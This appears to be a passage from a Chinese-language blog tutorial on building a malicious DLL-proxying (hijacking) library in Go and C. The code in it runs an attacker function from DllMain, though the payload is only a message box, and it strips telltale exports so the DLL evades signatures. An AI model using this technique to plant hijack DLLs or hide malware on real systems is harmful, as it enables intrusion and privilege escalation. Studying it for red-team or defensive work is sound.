                lpThrdParam->fdwReason = _fdwReason;
                lpThrdParam->lpReserved = _lpReserved;
                HANDLE hThread = CreateThread(NULL, 0, MyThreadFunction, lpThrdParam, 0, NULL);
                // CreateThread() because otherwise DllMain() is highly likely to deadlock.
            }
            break;
        case DLL_PROCESS_DETACH:
            // Perform any necessary cleanup.
            break;
        case DLL_THREAD_DETACH:
            // Do thread-specific cleanup.
            break;
        case DLL_THREAD_ATTACH:
            // Do thread-specific initialization.
            break;
        }
        return TRUE; // Successful.
    }
注意此处最好使用 `CreateThread` 来进行外部 Go 函数的调用，不然可能因为初始化 Go 运行时的问题导致死锁。
我们在该代码中 `DLL_PROCESS_ATTACH` 时异步调用了 OnProcessAttach，我们在 Golang 中实现这个恶意函数
#### Golang 恶意代码
我们现在来定义我们的恶意代码实现
    package main
    import "C"
    import (
        "unsafe"
        "syscall"
    )
    // MessageBox of Win32 API.
    func MessageBox(hwnd uintptr, caption, title string, flags uint) int {
        ret, _, _ := syscall.NewLazyDLL("user32.dll").NewProc("MessageBoxW").Call(
            uintptr(hwnd),
            uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(caption))),
            uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))),
            uintptr(flags))
        return int(ret)
    }
    // MessageBoxPlain of Win32 API.
    func MessageBoxPlain(title, caption string) int {
        const (
            NULL  = 0
            MB_OK = 0
        )
        return MessageBox(NULL, caption, title, MB_OK)
    }
    // OnProcessAttach is an async callback (hook).
    //export OnProcessAttach
    func OnProcessAttach(
        hinstDLL unsafe.Pointer, // handle to DLL module
        fdwReason uint32, // reason for calling function
        lpReserved unsafe.Pointer, // reserved
    ) {
        MessageBoxPlain("OnProcessAttach", "OnProcessAttach")
    }
    func main() {
        // Need a main function to make CGO compile package as C shared library
    }
此处我们实现了恶意函数 `OnProcessAttach`，只是弹个窗来模拟恶意代码。
#### 组合 Golang 和 c 编译
现在我们有了 .go 和 .c，还需要把它们两个粘合起来
##### 第一种方案
你可以通过 cgo 的一般写法，在 .go 的注释中把 c 代码拷贝进去，例如
    package main
    /*
    #include "dllmain.h"
    typedef struct {
        HINSTANCE hinstDLL;  // handle to DLL module
        DWORD fdwReason;     // reason for calling function // reserved
        LPVOID lpReserved;   // reserved
    } MyThreadParams;
    DWORD WINAPI MyThreadFunction(LPVOID lpParam) {
        MyThreadParams params = *((MyThreadParams*)lpParam);
        OnProcessAttach(params.hinstDLL, params.fdwReason, params.lpReserved);
        free(lpParam);
        return 0;
    }
    ...c源码文件
    */
    import "C"
    import (
        "unsafe"
        "syscall"
    )
    // MessageBox of Win32 API.
    func MessageBox(hwnd uintptr, caption, title string, flags uint) int {
        ret, _, _ := syscall.NewLazyDLL("user32.dll").NewProc("MessageBoxW").Call(
            uintptr(hwnd),
            uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(caption))),
            uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))),
            uintptr(flags))
        return int(ret)
    }
    ...go 源码文件
##### 第二种方案
或者你也可以给 .c 写一个头文件 .h，然后在 .go 中导入这个头文件，在 `go build` 的时候 Go 编译器会默认找到该目录下的
.c、.h、.go 一起编译。
比如你可以创建一个 .h 文件
    #include 
    void OnProcessAttach(HINSTANCE, DWORD, LPVOID);
    BOOL WINAPI DllMain(
        HINSTANCE _hinstDLL,  // handle to DLL module
        DWORD _fdwReason,     // reason for calling function
        LPVOID _lpReserved    // reserved
    );
然后在 .go 中引用它
    package main
    /*
    #include "dllmain.h"
    */
    import "C"
    import (
        "unsafe"
        "syscall"
    )
    // MessageBox of Win32 API.
    func MessageBox(hwnd uintptr, caption, title string, flags uint) int {
        ret, _, _ := syscall.NewLazyDLL("user32.dll").NewProc("MessageBoxW").Call(
            uintptr(hwnd),
            uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(caption))),
            uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))),
            uintptr(flags))
        return int(ret)
    }
然后就可以一起编译了。
### 导出表的问题
确实，现在我们可以编译出恶意的转发dll了，但是我们可能会发现导出表里面其实有很多奇奇怪怪的导出函数
这些导出函数可能会成为某些特征
我们的原始dll并没有这些导出函数，但是生成的转发dll这么多奇怪的导出函数该怎么去掉？
我们可以同样可以使用上文的 exp 文件来解决，它就是一个导出库文件，来定义有哪些导出的。
根据上文的方法我们使用 dlltool 从 def 文件生成一个 exp 文件，然后编译时加入链接即可。
    go build -buildmode=c-shared -o add.dll -ldflags="-extldflags=-Wl,/home/lab/Repo/go-dll-proxy/dllmain/functions.exp -s -w"
`ldflags` 里面的新增的 `-s -w` 只是为了减小一点体积去除一下符号，可选。
## 最后的最后
仓库相关示例已经上传至 [github.com/akkuman/go-dll-evil](https://github.com/akkuman/go-dll-evil)
感兴趣的可以查看。
## 参考资料
  * [1] [PE知识复习之PE的导出表](https://cloud.tencent.com/developer/article/1432448)
  * [2] [DLL Proxying](https://kevinalmansa.github.io/application%20security/DLL-Proxying/)
  * [3] [/EXPORT (Exports a Function)](https://docs.microsoft.com/en-us/cpp/build/reference/export-exports-a-function?view=msvc-160)
  * [4] [Windows Privilege Escalation - DLL Proxying](https://itm4n.github.io/dll-proxying/)
  * [5] [DLL Hijacking using DLL Proxying technique](https://lucabarile.github.io/Blog/dll_hijacking_and_proxying/index.html)
  * [6] [DLL之def和exp文件作用](https://www.cnblogs.com/depend-wind/articles/11885131.html)
  * [7] [mingw环境中使用dlltool工具来生成动态库的步骤](https://wenku.baidu.com/view/4ba786cbb9f3f90f76c61bc0.html)
  * [8] [Specifying the DEF file when compiling a DLL with Clang](https://stackoverflow.com/a/62360059/16654916)
  * [9] [issues - cmd/link: support msvc object files](https://github.com/golang/go/issues/20982)
  * [10] [gcc Options for Linking](https://gcc.gnu.org/onlinedocs/gcc/Link-Options.html)
  * [11] [RUSTGO: CALLING RUST FROM GO WITH NEAR-ZERO OVERHEAD](https://blog.filippo.io/rustgo/)
  * [12] [Go Execution Modes](https://docs.google.com/document/d/1nr-TQHw_er6GOQRsF6T43GGhFDelrAP0NqSS_00RgZQ/preview)
  * [13] [go tool link](https://pkg.go.dev/cmd/link)
  * [14] [DllMain entry point](https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain)
  * [15] [DllMain简介和DLL编写说明](https://www.geek-share.com/detail/2561615664.html)
  * [16] [Call Go function from C function](https://dev.to/mattn/call-go-function-from-c-function-1n3)
  * [17] [github.com/NaniteFactory/dllmain](https://github.com/NaniteFactory/dllmain)
  * [18] [How to implement DllMain entry point in Go](https://stackoverflow.com/a/67970294/16654916)